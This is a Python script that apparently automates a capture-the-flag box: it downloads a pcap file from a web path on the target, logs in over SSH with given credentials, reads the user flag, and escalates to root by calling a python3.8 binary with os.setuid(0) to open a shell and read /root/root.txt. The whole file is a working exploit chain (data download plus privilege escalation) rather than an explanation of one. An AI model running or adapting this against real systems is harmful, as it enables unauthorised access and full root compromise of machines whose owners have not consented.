import requests
import argparse
import paramiko


# Set up argument parsing
parser = argparse.ArgumentParser(description='Download pcap and login via SSH', epilog='Thank you !!')
parser.add_argument('--ip', help="Website IP", required=True)
parser.add_argument('-u', help="Username for SSH", required=True)
parser.add_argument('-p', help="Password for SSH", required=True)

# Parse the arguments
args = parser.parse_args()

def download():
    # Step 1: Download pcap file
    print("[+] Downloading the Pcap file.")
    try:
        # Use GET request since you want to download a file
        response = requests.get(f"http://{args.ip}/data/0")

        # Check if the request was successful
        if response.status_code == 200:
            print("[+] 200 OK")
            with open("Downloaded.pcap", "wb") as file:
                file.write(response.content)
            print("[+] Download success....")
        else:
            print(f"[-] Failed to download the file. Status code: {response.status_code}")

    except Exception as e:
        print(f"[-] An error occurred: {e}")

def execute_command(ssh, command, timeout=10):
    try:
        stdin, stdout, stderr = ssh.exec_command(command, timeout=timeout)
        output = stdout.read().decode()
        error = stderr.read().decode()
        if error:
            print(f"[-] Error: {error}")
        else:
            print(f"[+] Commands ouput:-  {output}")
        return output, error
    except Exception as e:
        print(f"[-] Exception: {str(e)}")
        return "", str(e)

def ssh_connect():
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    try:
        print("[+] Connecting to target")
        ssh.connect(args.ip, username=args.u, password=args.p)
        print("[+] Connected")
        
        commands = [
              "whoami",
              f"cat /home/{args.u}/user.txt",
              "/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system(\"whoami\")'",
              "/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'",
              "/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system(\"cat /root/root.txt\")'"
             ]
        
        for cmd in commands:
            execute_command(ssh, cmd)
            
    except paramiko.ssh_exception.AuthenticationException:
        print("[-] Authentication failed")
    except paramiko.ssh_exception.NoValidConnectionsError:
        print("[-] Connection failed")
    except Exception as e:
        print(f"[-] Error: {str(e)}")
    finally:
        ssh.close()
        print("[+] Exploit Completed!")

if __name__ == '__main__':
    download()
    ssh_connect()
                  
